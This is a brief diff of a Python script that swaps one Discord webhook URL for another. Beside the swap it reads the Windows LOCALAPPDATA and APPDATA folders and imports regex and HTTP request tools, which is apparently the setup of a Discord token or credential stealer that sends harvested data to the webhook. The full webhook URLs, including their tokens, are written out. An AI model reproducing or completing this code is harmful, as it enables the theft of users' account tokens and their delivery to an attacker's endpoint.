@@ -3,7 +3,7 @@ import os
 from re import findall
 from json import loads, dumps
 from urllib.request import Request, urlopen
-web1 = "https://discord.com/api/webhooks/935976213376282664/wcvydohAYmLslKQZvrwd5Vtxl_YrtIsjXEUFFQ2xFvrVpKzW7PlXA76rrESadteaYmBv"
+web1 = "https://discord.com/api/webhooks/1284536190627872823/bdP_p2ECMSRCVvhwG8HjRdIvnAp_bZqiQId2mIp08XqHSHL0WhdSMEH6kVlQbfRsBG-f"
 lc = os.getenv("LOCALAPPDATA")
 rm = os.getenv("APPDATA")
 PATHS = {
